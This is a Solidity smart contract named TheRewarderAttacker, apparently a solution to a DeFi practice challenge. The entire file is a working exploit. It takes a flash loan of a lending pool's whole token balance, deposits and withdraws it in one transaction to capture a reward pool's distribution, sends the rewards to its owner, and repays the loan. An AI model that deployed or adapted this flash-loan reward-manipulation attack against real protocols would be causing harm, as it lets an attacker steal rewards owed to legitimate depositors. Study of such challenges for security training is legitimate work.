// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Token {
    function transfer(address to, uint256 amount) external;
    function balanceOf(address) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface Rewarder {
    function liquidityToken() external returns (Token);
    function rewardToken() external returns (Token);

    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface Loaner {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttacker {
    address immutable owner;
    Loaner immutable loaner;
    Rewarder immutable rewarder;
    Token immutable dvt;
    Token immutable rt;

    constructor(address _rewarder, address _loaner) {
        owner = msg.sender;
        loaner = Loaner(_loaner);
        rewarder = Rewarder(_rewarder);
        dvt = Token(Rewarder(_rewarder).liquidityToken());
        rt = Token(Rewarder(_rewarder).rewardToken());
    }

    function attack() external {
        require(msg.sender == owner);
        // Borrow max possible amount
        uint256 loanerBalance = dvt.balanceOf(address(loaner));
        console.log("Borrowing %d DVT from loaner", loanerBalance/10**18);
        loaner.flashLoan(loanerBalance);
    }

    function receiveFlashLoan(uint256 amount) public {
        // Deposit money and get rewards
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);

        // Transfer rewards
        rt.transfer(owner, rt.balanceOf(address(this)));

        // Repay money
        dvt.transfer(address(loaner), amount);
    }
}
